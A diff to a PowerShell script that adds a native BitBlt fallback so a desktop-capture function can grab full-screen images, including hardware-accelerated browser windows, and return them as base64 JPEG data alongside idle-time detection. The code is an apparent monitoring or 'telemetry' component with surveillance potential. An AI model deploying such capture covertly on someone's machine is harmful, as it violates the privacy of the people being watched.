@@ -14,7 +14,7 @@ param(
 
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing -ErrorAction SilentlyContinue
 
-# Win32 GetLastInputInfo & SetProcessDPIAware API binding
+# Win32 GetLastInputInfo, SetProcessDPIAware & GDI Desktop Capture API binding
 $User32Signature = @"
 [DllImport("user32.dll")]
 public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
@@ -22,12 +22,25 @@ public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
 [DllImport("user32.dll")]
 public static extern bool SetProcessDPIAware();
 
+[DllImport("user32.dll")]
+public static extern IntPtr GetDC(IntPtr hwnd);
+
+[DllImport("user32.dll")]
+public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
+
 public struct LASTINPUTINFO {
     public uint cbSize;
     public uint dwTime;
 }
 "@
+
+$Gdi32Signature = @"
+[DllImport("gdi32.dll")]
+public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+"@
+
 Add-Type -MemberDefinition $User32Signature -Name User32API -Namespace Win32Utils -ErrorAction SilentlyContinue
+Add-Type -MemberDefinition $Gdi32Signature -Name Gdi32API -Namespace Win32Utils -ErrorAction SilentlyContinue
 
 try {
     [Win32Utils.User32API]::SetProcessDPIAware() | Out-Null
@@ -58,7 +71,18 @@ function Capture-DesktopBase64 {
 
         $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+        
+        # Primary Capture: SourceCopy mode handles hardware-accelerated browsers (Chrome, Edge, Firefox, FB Marketplace) & active windows
+        try {
+            $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size, [System.Drawing.CopyPixelOperation]::SourceCopy)
+        } catch {
+            # Secondary Native Win32 BitBlt Direct DC Fallback
+            $hdcSrc = [Win32Utils.User32API]::GetDC([IntPtr]::Zero)
+            $hdcDest = $graphics.GetHdc()
+            [Win32Utils.Gdi32API]::BitBlt($hdcDest, 0, 0, $bounds.Width, $bounds.Height, $hdcSrc, 0, 0, 0x00CC0020) | Out-Null
+            $graphics.ReleaseHdc($hdcDest)
+            [Win32Utils.User32API]::ReleaseDC([IntPtr]::Zero, $hdcSrc) | Out-Null
+        }
 
         $encoder = [System.Drawing.Imaging.Encoder]::Quality
         $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
@@ -76,7 +100,7 @@ function Capture-DesktopBase64 {
         $base64 = [Convert]::ToBase64String($bytes)
         return "data:image/jpeg;base64,$base64"
     } catch {
-        # Fallback: Create placeholder bitmap if screen is locked or sleeping (prevents telemetry drop)
+        # Fallback: Create placeholder bitmap if screen is locked or sleeping
         try {
             $fallbackBmp = New-Object System.Drawing.Bitmap 800, 450
             $g = [System.Drawing.Graphics]::FromImage($fallbackBmp)
